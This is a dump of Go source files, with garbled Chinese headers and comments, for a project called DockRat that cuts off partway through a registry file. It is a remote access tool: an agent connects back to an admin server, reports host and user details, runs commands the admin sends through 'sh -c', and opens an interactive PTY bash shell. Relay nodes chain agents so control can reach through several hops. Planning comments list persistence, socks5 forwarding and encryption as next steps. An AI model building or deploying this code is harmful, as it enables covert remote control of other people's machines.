å­æ–‡ä»¶å¤¹ï¼š./cmd
å­æ–‡ä»¶å¤¹ï¼š./cmd/admin
æ–‡ä»¶ï¼š./cmd/admin/main.go
å†…å®¹ï¼š

package main

import (
	"log"

	"github.com/Singert/DockRat/core/network"
	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/node"
)

var registry = node.NewRegistry()

func main() {
	log.Println("[+] Admin starting...")

	// å¯åŠ¨æ§åˆ¶å°å‘½ä»¤å¤„ç†
	go protocol.StartConsole(registry)

	// å¯åŠ¨ç›‘å¬å¹¶å¤„ç† Agent è¿æ¥
	network.StartListener(":9999", registry)
}


/*
å“åº”æ¶ˆæ¯ï¼ˆå¦‚ MsgResponseï¼‰ç¼“å­˜èµ·æ¥ï¼Œä»¥ä¾¿åœ¨æ§åˆ¶å°ä¸­è¾“å‡ºæœ€è¿‘ä¸€æ¡å“åº”ï¼Ÿ
ä½ ä¹Ÿå¯ä»¥å°† MsgShell è¾“å‡ºå®šå‘åˆ°å¸¦é¢œè‰²æˆ–å¸¦æç¤ºçš„ç»ˆç«¯ UIï¼Œåç»­æ”¯æŒé€€å‡ºã€ä¸Šä¼ ç­‰å‘½ä»¤æ‰©å±•ã€‚
å¦‚éœ€è¿›ä¸€æ­¥æ”¯æŒ shell ä¼šè¯ä¿æŒã€çª—å£è°ƒæ•´ã€æˆ– stdout ç¼“å­˜ï¼Œ
*/

å­æ–‡ä»¶å¤¹ï¼š./cmd/agent
æ–‡ä»¶ï¼š./cmd/agent/main.go
å†…å®¹ï¼š
package main

import (
	"encoding/json"
	"log"
	"net"
	"os"
	"runtime"

	"github.com/Singert/DockRat/core/network"
	"github.com/Singert/DockRat/core/protocol"
)

func main() {
	addr := "127.0.0.1:9999"

	if len(os.Args) > 1 {
		addr = os.Args[1]
	} else if env := os.Getenv("DOCKRAT_CONNECT"); env != "" {
		addr = env
	}

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		log.Fatalf("[-] Failed to connect to %s: %v", addr, err)
	}
	log.Printf("[+] Connected to %s", addr)

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	payload := protocol.HandshakePayload{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
	}
	payloadBytes, _ := json.Marshal(payload)

	msg := protocol.Message{
		Type:    protocol.MsgHandshake,
		Payload: payloadBytes,
	}

	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Fatalf("[-] Failed to encode message: %v", err)
	}

	_, err = conn.Write(data)
	if err != nil {
		log.Fatalf("[-] Failed to send message: %v", err)
	}

	log.Println("[+] Handshake message sent")

	network.StartBasicAgent(conn) // ä½¿ç”¨é»˜è®¤çš„ registry å‚æ•°
}

/*æ˜¯å¦ç»§ç»­å®ç°ï¼š

    ğŸš æŒä¹…åŒ– shell æ¨¡å¼ï¼ˆäº¤äº’å¼ stdin/stdoutï¼‰

    ğŸ›°ï¸ socks5 è½¬å‘æˆ–ç«¯å£æ˜ å°„

    ğŸ” TLS/AES åŠ å¯†é€šä¿¡å±‚

ä½ å¯ä»¥æŒ‡å®šæƒ³ä¼˜å…ˆå¼€å‘çš„å­æ¨¡å—ã€‚ */

å­æ–‡ä»¶å¤¹ï¼š./core
å­æ–‡ä»¶å¤¹ï¼š./core/common
æ–‡ä»¶ï¼š./core/common/config.go
å†…å®¹ï¼š
package common
æ–‡ä»¶ï¼š./core/common/id_allocator.go
å†…å®¹ï¼š
package common

import (
	"errors"
	"sync"
)

type IDAllocator struct {
	start  int
	count  int
	cursor int
	used   map[int]bool
	mu     sync.Mutex
}

func NewIDAllocator(start, count int) *IDAllocator {
	return &IDAllocator{
		start:  start,
		count:  count,
		cursor: 0,
		used:   make(map[int]bool),
	}
}

// åˆ†é…ä¸‹ä¸€ä¸ªå¯ç”¨ ID
func (a *IDAllocator) Next() (int, error) {
	a.mu.Lock()
	defer a.mu.Unlock()

	for i := 0; i < a.count; i++ {
		id := a.start + (a.cursor+i)%a.count
		if !a.used[id] {
			a.used[id] = true
			a.cursor = (a.cursor + i + 1) % a.count
			return id, nil
		}
	}
	return -1, errors.New("no available ID in range")
}

// æ‰‹åŠ¨é‡Šæ”¾ IDï¼ˆç”¨äºå¤±è´¥å›æ»šï¼‰
func (a *IDAllocator) Free(id int) {
	a.mu.Lock()
	defer a.mu.Unlock()
	delete(a.used, id)
}

æ–‡ä»¶ï¼š./core/common/logger.go
å†…å®¹ï¼š
package common

å­æ–‡ä»¶å¤¹ï¼š./core/crypto
æ–‡ä»¶ï¼š./core/crypto/cipher.go
å†…å®¹ï¼š
package crypto
å­æ–‡ä»¶å¤¹ï¼š./core/network
æ–‡ä»¶ï¼š./core/network/connection.go
å†…å®¹ï¼š
package network

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"regexp"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
)

// -------------------------- adminä¸“ç”¨çš„ç›‘å¬å‡½æ•° -------------------------
var ansiRegex = regexp.MustCompile(`\x1b\[[0-9;?]*[a-zA-Z]`)

func StartListener(addr string, registry *node.Registry) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[!] Failed to listen on %s: %v", addr, err)
	}
	log.Printf("[+] Listening on %s", addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[!] Accept error:", err)
			continue
		}
		go handleConnection(conn, registry)
	}
}

func handleConnection(conn net.Conn, registry *node.Registry) {
	log.Printf("[+] New connection from %s", conn.RemoteAddr())

	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[!] Failed to read message length:", err)
		conn.Close()
		return
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[!] Failed to read message body:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil {
		log.Println("[!] Failed to decode message:", err)
		conn.Close()
		return
	}

	if msg.Type == protocol.MsgHandshake {
		var payload protocol.HandshakePayload
		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
			log.Println("[!] Failed to decode handshake payload:", err)
			conn.Close()
			return
		}

		n := &node.Node{
			Conn:     conn,
			Hostname: payload.Hostname,
			Username: payload.Username,
			OS:       payload.OS,
			Addr:     conn.RemoteAddr().String(),
		}
		id := registry.Add(n)
		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)

		go handleAgentMessages(n, registry)
	} else {
		log.Println("[!] Unknown message type:", msg.Type)
		conn.Close()
	}
}

func handleAgentMessages(n *node.Node, registry *node.Registry) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Node %d read failed: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
			continue
		}

		switch msg.Type {
		case protocol.MsgResponse:
			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
		case protocol.MsgShell:
			writeShellOutput(msg.Payload)
		case protocol.MsgRelayReady:
			var payload protocol.RelayReadyPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayReady decode failed: %v", err)
				return
			}
			log.Printf("[Relay Ready] Node %d (%s) is now acting as relay ", payload.SelfID, payload.ListenAddr)

		case protocol.MsgRelayRegister:
			var payload protocol.RelayRegisterPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayRegister decode failed: %v", err)
				return
			}
			newNode := payload.Node
			newID := newNode.ID
			if _, exists := registry.Get(newID); exists {
				log.Printf("[-] Duplicate node ID %d rejected", newID)
				resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
				sendAck(n.Conn, protocol.MsgRelayError, resp)
				return
			}
			registry.AddWithID(&newNode)
			registry.NodeGraph.SetParent(newID, payload.ParentID)
			log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
			resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
			sendAck(n.Conn, protocol.MsgRelayAck, resp)

		case protocol.MsgRelayPacket:
			fmt.Printf("[Admin] Received relay_packet from node %d\n", n.ID)
			var pkt protocol.RelayPacket
			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
				log.Printf("[-] RelayPacket decode failed: %v", err)
				return
			}

			reader := bytes.NewReader(pkt.Data)
			innerMsg, err := protocol.ReadMessage(reader)
			if err != nil {
				log.Printf("[-] Failed to decode inner message: %v", err)
				return
			}

			if pkt.DestID == -1 {
				switch innerMsg.Type {
				case protocol.MsgRelayRegister:
					var payload protocol.RelayRegisterPayload
					if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
						log.Printf("[-] RelayRegister decode failed: %v", err)
						return
					}
					newNode := payload.Node
					newID := newNode.ID
					if _, exists := registry.Get(newID); exists {
						log.Printf("[-] Duplicate node ID %d rejected", newID)
						resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
						sendAck(n.Conn, protocol.MsgRelayError, resp)
						return
					}
					registry.AddWithID(&newNode)
					registry.NodeGraph.SetParent(newID, payload.ParentID)
					log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
					resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
					sendAck(n.Conn, protocol.MsgRelayAck, resp)

				case protocol.MsgShell:
					log.Printf("[Admin] Displaying shell output (direct):")
					writeShellOutput(innerMsg.Payload)

				default:
					log.Printf("[-] Unknown message type sent to admin: %s", innerMsg.Type)
				}
				return
			}

			// relay â†’ relay/admin æ­£å¸¸ä¸‹å‘
			switch innerMsg.Type {
			case protocol.MsgResponse:
				log.Printf("[#] Node %d response:\n%s", pkt.DestID, string(innerMsg.Payload))
			case protocol.MsgShell:
				writeShellOutput(innerMsg.Payload)
			default:
				// å‘ä¸‹ relay
				parentID := registry.NodeGraph.GetParent(pkt.DestID)
				if parentID == -1 {
					log.Printf("[-] No parent found for dest ID %d", pkt.DestID)
					return
				}
				parentNode, ok := registry.Get(parentID)
				if !ok || parentNode.Conn == nil {
					log.Printf("[-] Cannot forward to %d: no relay node found", pkt.DestID)
					return
				}
				fwdMsg := protocol.Message{
					Type:    protocol.MsgRelayPacket,
					Payload: msg.Payload,
				}
				buf, err := protocol.EncodeMessage(fwdMsg)
				if err != nil {
					log.Printf("[-] Failed to encode relay forward: %v", err)
					return
				}
				_, err = parentNode.Conn.Write(buf)
				if err != nil {
					log.Printf("[-] Failed to relay to %d via %d: %v", pkt.DestID, parentID, err)
				}
			}
		default:
			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
		}
	}
}

func writeShellOutput(payload []byte) {
	clean := ansiRegex.ReplaceAll(payload, []byte{})

	// è¿‡æ»¤å¸¸è§ bash æç¤ºç¬¦å‰ç¼€
	clean = bytes.ReplaceAll(clean, []byte("bash-5.2$ "), []byte(""))
	clean = bytes.ReplaceAll(clean, []byte("bash-5.1$ "), []byte(""))

	os.Stdout.Write(clean)
	os.Stdout.Sync()
}
func sendAck(conn net.Conn, msgType protocol.MessageType, ack protocol.RelayAckPayload) {
	data, _ := json.Marshal(ack)
	msg := protocol.Message{
		Type:    msgType,
		Payload: data,
	}
	buf, _ := protocol.EncodeMessage(msg)
	conn.Write(buf)
}

æ–‡ä»¶ï¼š./core/network/dispatcher.go
å†…å®¹ï¼š
package network

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"

	"golang.org/x/term"

	"github.com/Singert/DockRat/core/common"
	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
	"github.com/creack/pty"
)

type ShellSession struct {
	Stdin   io.WriteCloser
	Started bool
}

const BasicAgentID = -100 // é»˜è®¤Basicæ¨¡å¼å›ºå®šä¼ªID
var shellSessionMap = make(map[int]*ShellSession)

// âœ… ç»Ÿä¸€å…¥å£ï¼šé»˜è®¤ agent å¯åŠ¨æ¨¡å¼
func StartBasicAgent(conn net.Conn) {
	for {
		msg, err := readMessageFromConn(conn)
		if err != nil {
			log.Printf("[-] Agent connection closed: %v", err)
			return
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn, nil)
		case protocol.MsgShell:

			handleShellPTY(msg, conn, nil, BasicAgentID)
		case protocol.MsgStartRelay:
			// ğŸ” åŠ¨æ€è½¬ä¸º relay æ¨¡å¼
			handleStartRelay(msg, conn)
			return // åœæ­¢ BasicAgent å¾ªç¯ï¼Œç”± relay æ¥ç®¡è¿æ¥
		default:
			log.Printf("[-] Unknown or unsupported message: %s", msg.Type)
		}
	}
}

// âœ… relay agent çš„æ¶ˆæ¯å¤„ç†é€»è¾‘
func StartRelayAgent(conn net.Conn, ctx *RelayContext) {
	for {
		msg, err := readMessageFromConn(conn)
		if err != nil {
			log.Printf("[-] RelayAgent connection error: %v", err)
			return
		}
		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn, ctx)
		case protocol.MsgShell:
			handleShellPTY(msg, conn, ctx, ctx.SelfID)
		case protocol.MsgRelayPacket:
			var pkt protocol.RelayPacket
			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
				log.Println("[-] Decode relay_packet failed:", err)
				continue
			}
			HandleRelayPacket(ctx, pkt)
		case protocol.MsgRelayAck:
			var ack protocol.RelayAckPayload
			_ = json.Unmarshal(msg.Payload, &ack)
			log.Printf("[+] Relay register success: %s", ack.Message)
		case protocol.MsgRelayError:
			var errMsg protocol.RelayAckPayload
			_ = json.Unmarshal(msg.Payload, &errMsg)
			log.Printf("[!] Relay register failed: %s", errMsg.Message)
		default:
			log.Printf("[-] RelayAgent unknown message type: %s", msg.Type)
		}
	}
}

// âœ… å¤„ç† admin å‘æ¥çš„ startrelay è¯·æ±‚ï¼ŒåŠ¨æ€åˆ‡æ¢ä¸º relay èŠ‚ç‚¹
func handleStartRelay(msg protocol.Message, conn net.Conn) {
	var payload protocol.StartRelayPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] StartRelay payload decode error:", err)
		return
	}

	log.Printf("[*] Received startrelay: listen on %s, ID range [%d ~ %d]",
		payload.ListenAddr, payload.IDStart, payload.IDStart+payload.Count-1)

	ctx := &RelayContext{
		SelfID:      payload.SelfID,
		Registry:    node.NewRegistry(),
		Topology:    node.NewNodeGraph(),
		IDAllocator: common.NewIDAllocator(payload.IDStart, payload.Count),
		Upstream:    conn,
	}

	go StartRelayListener(payload.ListenAddr, ctx)

	ack := protocol.RelayReadyPayload{
		SelfID:     ctx.SelfID,
		ListenAddr: payload.ListenAddr,
	}
	data, _ := json.Marshal(ack)
	resp := protocol.Message{Type: protocol.MsgRelayReady, Payload: data}
	buf, _ := protocol.EncodeMessage(resp)
	conn.Write(buf)

	go StartRelayAgent(conn, ctx) // ç”¨äºå¤„ç† admin å‘ relay å‘æ¥çš„æ§åˆ¶å‘½ä»¤

	select {}
}

// âœ… è¯»å–ä¸€ä¸ªæ¶ˆæ¯å¸§
func readMessageFromConn(conn net.Conn) (protocol.Message, error) {
	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		return protocol.Message{}, err
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return protocol.Message{}, err
	}
	return protocol.DecodeMessage(data)
}

// âœ… å‘½ä»¤æ‰§è¡Œå¤„ç†
func handleCommand(msg protocol.Message, conn net.Conn, ctx *RelayContext) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Command unmarshal error:", err)
		return
	}
	cmdStr := payload["cmd"]
	log.Println("[+] Received command:", cmdStr)

	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
	if err != nil {
		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
	}

	resp := protocol.Message{Type: protocol.MsgResponse, Payload: output}

	if ctx != nil {
		RelayUpward(ctx, resp)
	} else {
		data, _ := protocol.EncodeMessage(resp)
		conn.Write(data)
	}
}

func handleShellPTY(msg protocol.Message, conn net.Conn, ctx *RelayContext, nodeID int) {
	line := string(msg.Payload)
	log.Printf("[Shell] Received shell input from admin: %q (node %d)", line, nodeID)

	// è·å–æˆ–åˆå§‹åŒ–ä¼šè¯
	session, exists := shellSessionMap[nodeID]
	if !exists {
		cmd := exec.Command("bash", "--norc", "--noprofile") // âœ… æ›´çœŸå®çš„äº¤äº’ç¯å¢ƒ
		cmd.Env = append(os.Environ(), "TERM=xterm")         // âœ… åŠ å¼ºå…¼å®¹æ€§

		ptmx, err := pty.Start(cmd)
		if err != nil {
			log.Println("[-] Failed to start pty:", err)
			return
		}
		if _, err := term.MakeRaw(int(ptmx.Fd())); err != nil {
			log.Println("[-] Failed to set PTY raw mode:", err)
		}
		session = &ShellSession{
			Stdin:   ptmx,
			Started: true,
		}
		shellSessionMap[nodeID] = session

		// âœ… å¯åŠ¨ goroutine è¯»å– shell è¾“å‡º
		go func() {
			buf := make([]byte, 1024)
			for {
				n, err := ptmx.Read(buf)
				if err != nil {
					log.Printf("[-] Shell session for node %d read error: %v", nodeID, err)
					return
				}
				if n == 0 {
					continue
				}
				payload := buf[:n]
				log.Printf("[Shell] Read %d bytes from PTY for node %d: %q", n, nodeID, payload)

				msg := protocol.Message{
					Type:    protocol.MsgShell,
					Payload: payload,
				}

				if ctx != nil && nodeID != ctx.SelfID {
					log.Printf("[Shell] Relaying shell output upward from node %d", nodeID)
					RelayUpward(ctx, msg)
				} else {
					data, _ := protocol.EncodeMessage(msg)
					conn.Write(data)
				}
			}
		}()
	}

	// å†™å…¥ shell å‘½ä»¤
	if !strings.HasSuffix(line, "\n") {
		line += "\n"
	}
	_, err := session.Stdin.Write([]byte(line))
	if err != nil {
		log.Printf("[-] Write to shell session %d failed: %v", nodeID, err)
	}
}

func FindNodeIDByConn(reg *node.Registry, conn net.Conn) int {
	for _, n := range reg.List() {
		if n.Conn == conn {
			return n.ID
		}
	}
	return -1
}
func StartBasicAgentWithID(conn net.Conn, ctx *RelayContext, nodeID int) {
	for {
		msg, err := readMessageFromConn(conn)
		if err != nil {
			log.Printf("[-] Agent connection closed: %v", err)
			return
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn, ctx)
		case protocol.MsgShell:
			handleShellPTY(msg, conn, ctx, nodeID) // âœ… ç”¨ relay åˆ†é…çš„çœŸå® ID
		case protocol.MsgStartRelay:
			handleStartRelay(msg, conn)
			return
		default:
			log.Printf("[-] Unknown or unsupported message: %s", msg.Type)
		}
	}
}

æ–‡ä»¶ï¼š./core/network/packet.go
å†…å®¹ï¼š
package network
æ–‡ä»¶ï¼š./core/network/relay.go
å†…å®¹ï¼š
package network

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/Singert/DockRat/core/common"
	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
)

// -------------------------------ä¸­ç»§èŠ‚ç‚¹ä¸“ç”¨ç›‘å¬å‡½æ•° -------------------------------

// RelayContext æŒæœ‰æœ¬ relay èŠ‚ç‚¹çš„æ‰€æœ‰çŠ¶æ€
type RelayContext struct {
	SelfID      int
	Registry    *node.Registry
	Topology    *node.NodeGraph
	IDAllocator *common.IDAllocator
	Upstream    net.Conn // ä¸ä¸Šçº§ admin æˆ– relay çš„è¿æ¥
}

// å¯åŠ¨ relay ç›‘å¬å™¨
func StartRelayListener(addr string, ctx *RelayContext) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[-] Relay listen failed on %s: %v", addr, err)
	}
	log.Printf("[Relay %d] Listening on %s", ctx.SelfID, addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[-] Relay accept error:", err)
			continue
		}
		go HandleRelayConnection(conn, ctx)
	}
}

// æ¥æ”¶ agentY å¹¶åˆ†é… IDï¼Œæ³¨å†Œåä¸ŠæŠ¥ç»™ä¸Šçº§
func HandleRelayConnection(conn net.Conn, ctx *RelayContext) {
	log.Printf("[Relay %d] New connection from %s", ctx.SelfID, conn.RemoteAddr())

	// è¯»å–æ¶ˆæ¯é•¿åº¦ä¸å†…å®¹ï¼ˆä¸ handleConnection ä¸€è‡´ï¼‰
	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[-] Read length failed:", err)
		conn.Close()
		return
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[-] Read payload failed:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil || msg.Type != protocol.MsgHandshake {
		log.Println("[-] Invalid or non-handshake message")
		conn.Close()
		return
	}

	var payload protocol.HandshakePayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Handshake decode failed:", err)
		conn.Close()
		return
	}

	// åˆ†é… ID
	newID, err := ctx.IDAllocator.Next()
	if err != nil {
		log.Println("[-] No available ID for new node")
		conn.Close()
		return
	}

	n := &node.Node{
		ID:       newID,
		Conn:     conn,
		Hostname: payload.Hostname,
		Username: payload.Username,
		OS:       payload.OS,
		Addr:     conn.RemoteAddr().String(),
	}

	ctx.Registry.AddWithID(n)
	ctx.Topology.SetParent(n.ID, ctx.SelfID)
	log.Printf("[Relay %d] Registered child ID %d (%s@%s)", ctx.SelfID, n.ID, n.Username, n.Hostname)

	// ä¸ŠæŠ¥ç»™ admin
	liteNode := &node.Node{
		ID:       newID,
		Hostname: payload.Hostname,
		Username: payload.Username,
		OS:       payload.OS,
		Addr:     conn.RemoteAddr().String(),
	}
	report := protocol.RelayRegisterPayload{
		ParentID: ctx.SelfID,
		Node:     *liteNode,
	}
	reportBytes, _ := json.Marshal(report)
	msgOut := protocol.Message{
		Type:    protocol.MsgRelayRegister,
		Payload: reportBytes,
	}

	// åˆ¤æ–­æ˜¯å¦å‘ admin ä¸ŠæŠ¥ï¼ˆID -1 è¡¨ç¤º adminï¼‰
	switch ctx.SelfID {
	case -1:
		// ä¸åº”è¯¥å‘ç”Ÿï¼šRelayContext ä¸åº”ä¸º -1
		log.Println("[-] Invalid SelfID == -1 in relay")
	case 0:
		// relay0 â†’ adminï¼ˆç›´æ¥è¿æ¥ï¼‰
		buf, _ := protocol.EncodeMessage(msgOut)
		ctx.Upstream.Write(buf)
	default:
		// relayN â†’ relayX â†’ ... â†’ adminï¼ˆå°è£…ä¸º RelayPacket å‘ä¸Šï¼‰
		inner, _ := json.Marshal(msgOut)
		pkt := protocol.RelayPacket{
			DestID: -1, // admin ID ç»Ÿä¸€çº¦å®šä¸º -1
			Data:   inner,
		}
		pktBytes, _ := json.Marshal(pkt)
		wrapped := protocol.Message{
			Type:    protocol.MsgRelayPacket,
			Payload: pktBytes,
		}
		buf, _ := protocol.EncodeMessage(wrapped)
		ctx.Upstream.Write(buf)
	}

	// FIXME:// å¯åŠ¨æ¶ˆæ¯è¯»å–
	// go HandleRelayAgentMessages(n, ctx)

	//ç›‘å¬æ¥è‡ªè¯¥è¿æ¥çš„ relay_packet ä¸ŠæŠ¥ï¼ˆå¦‚ï¼šrelayN æ³¨å†Œä¿¡æ¯ï¼‰
	// go StartRelayAgent(conn, ctx)

	go HandleRelayAgentMessages(n, ctx)
	go StartBasicAgentWithID(conn, ctx, n.ID)
	select {}
}

// è¯¥å‡½æ•°ä¸ admin çš„ handleAgentMessages() ç±»ä¼¼ï¼Œ
// ä½† relay ä¸ç›´æ¥å¤„ç†ä¸šåŠ¡æ¶ˆæ¯ï¼Œ
// è€Œæ˜¯å°†å…¶å°è£…ä¸º RelayPacket å¹¶è½¬å‘ç»™ ctx.Upstreamï¼ˆadminï¼‰ã€‚
func HandleRelayAgentMessages(n *node.Node, ctx *RelayContext) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[Relay] Node %d disconnected: %v", n.ID, err)
			ctx.Registry.Remove(n.ID)
			ctx.Topology.RemoveNode(n.ID)
			ctx.IDAllocator.Free(n.ID)
			conn.Close()
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[Relay] Node %d read failed: %v", n.ID, err)
			ctx.Registry.Remove(n.ID)
			ctx.Topology.RemoveNode(n.ID)
			ctx.IDAllocator.Free(n.ID)
			conn.Close()
			return
		}

		// âœ… è§£ç  + é‡æ–° json ç¼–ç 
		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Decode inner message failed: %v", err)
			continue
		}
		fmt.Println("Relay received message from node", n.ID, ":", msg)
		innerJson, _ := protocol.EncodeMessage(msg)
		fmt.Printf("[Relay %d] â†‘ RelayUpward called for message: Type=%s\n", ctx.SelfID, msg.Type)

		// âœ… æ„é€  RelayPacket ä¸Šé€
		pkt := protocol.RelayPacket{
			DestID: -1,
			Data:   innerJson,
		}
		pktBytes, _ := json.Marshal(pkt)
		msgOut := protocol.Message{
			Type:    protocol.MsgRelayPacket,
			Payload: pktBytes,
		}
		fmt.Println("Relay sending packet to admin:", pkt)
		out, _ := protocol.EncodeMessage(msgOut)
		ctx.Upstream.Write(out)
	}
}

// è¯¥å‡½æ•°ç”¨äº relay æ”¶åˆ°ä¸€ä¸ª RelayPacket åï¼Œå‘ä¸‹è·¯ç”±ç›®æ ‡ agentã€‚
// ç‰¹æ®Šæƒ…å†µï¼šç›®æ ‡æ˜¯ adminï¼ˆçº¦å®š ID = -1ï¼‰
func HandleRelayPacket(ctx *RelayContext, pkt protocol.RelayPacket) {
	fmt.Printf("[Relay %d] HandleRelayPacket called, DestID=%d\n", ctx.SelfID, pkt.DestID)
	// ç‰¹æ®Šæƒ…å†µï¼šç›®æ ‡æ˜¯ adminï¼ˆçº¦å®š ID = -1ï¼‰
	if pkt.DestID == -1 {
		// ä¸å¤„ç†å†…å®¹ï¼Œåªåšé€ä¼ å‘ä¸Š
		pktBytes, _ := json.Marshal(pkt)
		wrapped := protocol.Message{
			Type:    protocol.MsgRelayPacket,
			Payload: pktBytes,
		}
		buf, _ := protocol.EncodeMessage(wrapped)
		ctx.Upstream.Write(buf)
		fmt.Printf("[Relay %d] Relay packet to admin: %s\n", ctx.SelfID, pkt.Data)
		return
	}

	// æ­£å¸¸å‘ä¸‹è·¯ç”±ç›®æ ‡ agent
	conn, err := findRelayChildConn(ctx, pkt.DestID)
	if err != nil {
		log.Printf("[-] Relay %d cannot find child %d: %v", ctx.SelfID, pkt.DestID, err)
		// dump local topology
		fmt.Printf("[Relay %d] Current Topology:\n", ctx.SelfID)
		for _, n := range ctx.Registry.List() {
			fmt.Printf("  - Node[%d] => Conn: %v\n", n.ID, n.Conn != nil)
		}
		return
	}

	_, err = conn.Write(pkt.Data)
	if err != nil {
		log.Printf("[-] Relay: write to node %d failed: %v", pkt.DestID, err)
		ctx.Registry.Remove(pkt.DestID)
		ctx.Topology.RemoveNode(pkt.DestID)
		ctx.IDAllocator.Free(pkt.DestID)
	}
}

func findRelayChildConn(ctx *RelayContext, destID int) (net.Conn, error) {
	curr := destID
	for {
		parent := ctx.Topology.GetParent(curr)
		if parent == ctx.SelfID {
			node, ok := ctx.Registry.Get(curr)
			if ok && node.Conn != nil {
				return node.Conn, nil
			}
			return nil, fmt.Errorf("direct child node %d has no conn", curr)
		}
		if parent == -1 {
			return nil, fmt.Errorf("target %d is not under this relay", destID)
		}
		curr = parent
	}
}

æ–‡ä»¶ï¼š./core/network/utils.go
å†…å®¹ï¼š
package network

import (
	"encoding/json"
	"log"

	"github.com/Singert/DockRat/core/protocol"
)

func bytesToUint32(b []byte) uint32 {
	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}
func RelayUpward(ctx *RelayContext, msg protocol.Message) {
	log.Printf("[RelayUpward] type=%s len=%d", msg.Type, len(msg.Payload))

	inner, _ := protocol.EncodeMessage(msg) // âœ… ä½¿ç”¨æ­£ç¡®çš„å¸¦å‰ç¼€æ ¼å¼
	pkt := protocol.RelayPacket{
		DestID: -1,
		Data:   inner,
	}
	pktBytes, _ := json.Marshal(pkt)

	wrapped := protocol.Message{
		Type:    protocol.MsgRelayPacket,
		Payload: pktBytes,
	}
	buf, _ := protocol.EncodeMessage(wrapped)
	ctx.Upstream.Write(buf)
}

å­æ–‡ä»¶å¤¹ï¼š./core/node
æ–‡ä»¶ï¼š./core/node/registry.go
å†…å®¹ï¼š
// File: core/node/registry.go
package node

import (
	"fmt"
	"net"
	"sync"
)

type Node struct {
	ID       int
	Conn     net.Conn
	Hostname string
	Username string
	OS       string
	Addr     string
}

type Registry struct {
	nodes     map[int]*Node
	mu        sync.Mutex
	nextID    int
	NodeGraph *NodeGraph
}

func NewRegistry() *Registry {
	return &Registry{
		nodes:     make(map[int]*Node),
		NodeGraph: NewNodeGraph(), // åˆå§‹åŒ–æ‹“æ‰‘å›¾
	}
}

func (r *Registry) Add(node *Node) int {
	r.mu.Lock()
	defer r.mu.Unlock()

	id := r.nextID
	node.ID = id
	r.nodes[id] = node
	r.nextID++
	return id
}

func (r *Registry) List() []*Node {
